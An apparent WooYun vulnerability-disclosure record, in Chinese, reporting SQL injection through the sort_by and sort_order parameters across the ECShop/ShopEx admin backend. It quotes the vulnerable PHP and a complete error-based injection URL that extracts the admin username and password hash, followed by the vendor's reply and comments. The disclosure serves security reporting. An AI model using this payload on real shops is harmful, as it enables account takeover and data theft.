{"id": 10235, "wybug_id": "wooyun-2013-024827", "wybug_title": "eshop后台大面积sql注入", "wybug_corp": "ShopEx", "wybug_author": "齐迹", "wybug_date": "2013-05-30 21:33", "wybug_open_date": "2013-08-28 21:33", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-28：\t细节向公众公开  简要描述： 自从某数字公司悬赏后，数字公司没火，乌云上对ec的漏洞频繁爆出。。不知是什么一个情况？虽然后台漏洞大多数没钱。但是本着审核代码的原则。还是提一下把混点rank也好。现在rank是111 不吉利啊 详细说明：  后台大规模的存在 order by 注入搜索了一下 $_REQUEST['sort_by'] 或者$_REQUEST['sort_order'] 大约涉及到30多个文件。。。我的天。30多处！！ec的开发人员都是copy代码的吗？？说代码把拿一处来讲把 这里没有检查权限admin\\ads.php 行36\nif ($_REQUEST['act'] == 'list'){    $pid = !empty($_REQUEST['pid']) ? intval($_REQUEST['pid']) : 0;    $smarty->assign('ur_here',     $_LANG['ad_list']);    $smarty->assign('action_link', array('text' => $_LANG['ads_add'], 'href' => 'ads.php?act=add'));    $smarty->assign('pid',         $pid);     $smarty->assign('full_page',  1);    $ads_list = get_adslist();...}\n未检查权限，只要登录状态即可。接着查看 get_adslist 方法\nfunction get_adslist(){    /* 过滤查询 */    $pid = !empty($_REQUEST['pid']) ? intval($_REQUEST['pid']) : 0;    $filter = array();    $filter['sort_by']    = empty($_REQUEST['sort_by']) ? 'ad.ad_name' : trim($_REQUEST['sort_by']);    $filter['sort_order'] = empty($_REQUEST['sort_order']) ? 'DESC' : trim($_REQUEST['sort_order']);.....$arr = array();    $sql = 'SELECT ad.*, COUNT(o.order_id) AS ad_stats, p.position_name '.            'FROM ' .$GLOBALS['ecs']->table('ad'). 'AS ad ' .            'LEFT JOIN ' . $GLOBALS['ecs']->table('ad_position'). ' AS p ON p.position_id = ad.position_id '.            'LEFT JOIN ' . $GLOBALS['ecs']->table('order_info'). \" AS o ON o.from_ad = ad.ad_id $where \" .            'GROUP BY ad.ad_id '.            'ORDER by '.$filter['sort_by'].' '.$filter['sort_order'];}\n$filter['sort_by'] $filter['sort_order'] 直接到sql里面。剩下的就简单了   漏洞证明：  利用代码http://www.abc.com/admin/ads.php?act=list&sort_by=sort_order%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(user_name,0x3a,password)%20from%20ecs_admin_user%20limit%201)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20`information_schema`.tables%20group%20by%20x)a)%20and%201=1\n\n有了MD5 在结合我之前提的找回密码，即可轻松破解密码。。   修复方案：  这么低级的漏洞 前台都是修复了的 后台就不舍得修复一下吗？程序员该打屁屁了！   版权声明：转载请注明来源 齐迹@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2013-05-30 21:38 厂商回复： 感谢您为shopex安全做的贡献我们会尽快处理非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-30 21:49 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  2rank.... 好把！    \n     2013-05-31 00:22 |    \t\tKuuki \t\t\t( 普通白帽子  |\t\t\t        Rank:158 漏洞数:23        | :P)\t\t \n  至少脱离111的目的达成了- -  马克一下    \n     2013-05-31 08:57 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @Kuuki 对 应该满怀感激之情！    \n     2013-05-31 10:33 |    \t\tt00000by57 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | Access Denied.)\t\t \n  shopex跟ecshop是什么关系 好基友么    \n     2013-05-31 12:41 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @t00000by57 相亲相爱的一家人    \n     2013-06-24 00:28 |    \t\tby:安全者 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 只做安全者，不做入侵者！)\t\t \n  SHOPEX ECSHOP　已经是一家公司了　忽忽    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}